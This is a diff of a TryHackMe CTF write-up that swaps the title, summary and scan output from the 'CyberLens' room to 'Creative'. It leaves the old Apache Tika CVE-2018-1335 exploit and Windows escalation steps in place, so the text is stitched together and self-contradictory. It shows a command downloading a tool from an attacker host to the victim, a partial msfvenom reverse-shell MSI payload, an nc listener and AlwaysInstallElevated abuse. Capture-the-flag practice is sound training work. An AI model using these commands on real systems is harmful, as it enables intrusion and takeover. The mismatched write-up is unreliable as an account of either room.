@@ -1,18 +1,18 @@
 ---
-title: THM CyberLens
+title: THM Creative
 author: hanhctf
-date: 2024-05-20 12:00:00 +0700
+date: 2024-05-21 12:00:00 +0700
 categories: [Write-up, THM]
-tags: [CVE-2018-1335]
+tags: []
 toc: true
 mermaid: true
 ---
 
-# [**CyberLens**](https://tryhackme.com/r/room/cyberlensp6)
+# [**Creative**](https://tryhackme.com/r/room/creative)
 
 # Summary
 >
-> - Port 61777 open ==> Apache Tika 1.17 Server ==> CVE-2018-1335
+> - beta subdomain
 > - Use metasploit exploit user
 > - Use PrivescCheck.ps1, check Windows Privilege Escalation  
 > - AlwaysInstallElevated vuln
@@ -20,32 +20,32 @@ mermaid: true
 ## NMAP
 
 ```text
-PORT      STATE SERVICE       REASON  VERSION
-80/tcp    open  http          syn-ack Apache httpd 2.4.57 ((Win64))
-135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
-139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds? syn-ack
-3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
-5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
-49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
-49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
-49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
-49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
-49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
-49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
-49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
-61777/tcp open  http          syn-ack Jetty 8.y.z-SNAPSHOT
+Nmap scan report for creative.thm (10.10.204.200)
+Host is up (0.40s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
+|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
+|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Creative Studio | Free Bootstrap 4.3.x template
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ## Web Enumeration
 
-After enumeration port 80, nothing interested.  
+The Nmap scan reveals only two ports: port 22, on which we have SSH, and port 80, a web server with nginx 1.18.0.
 
-Continous enumeration port 61777, we can see Apache Tika 1.17 Server.
+Nothing interesting on the web server.
 
-![](/commons/THM/CyberLens/0_Apache_Tika_1.17_Server.png)
+Time to enumerate some subdomains `creative.thm`.
+
+We find the subdomain `beta.creative.thm`.
+
+![](/commons/THM/Creative/0_subdomain.png)
 
 Quick search, we found CVE-201801335 for Apache Tika 1.17 Server on [exploit-db](https://www.exploit-db.com/exploits/47208)
 
@@ -63,9 +63,7 @@ Worked.
 This tool can find in Github [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck).
 
 We can use curl to upload PrivescCheck.ps1 to victim via powershell.
-
 In this case. I run local server with `python3 -m http.server 80` to host PrivescCheck.ps1 file.
-
 In victim machine, we get .ps1 via `Invoke-WebRequest -Uri http://attack_IP:port/PrivescCheck.ps1 -Outfile PrivescCheck.ps1`
 
 Run tools:
@@ -85,11 +83,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --p
 ```
 
 And upload from local.
-
 In another terminal, listen on port 443 `sudo nc -nlvp 443`
 
 After get evil.msi in victim from local.
-
 Just run file. And we got system.
 ![](/commons/THM/CyberLens/3_Root.png)
 
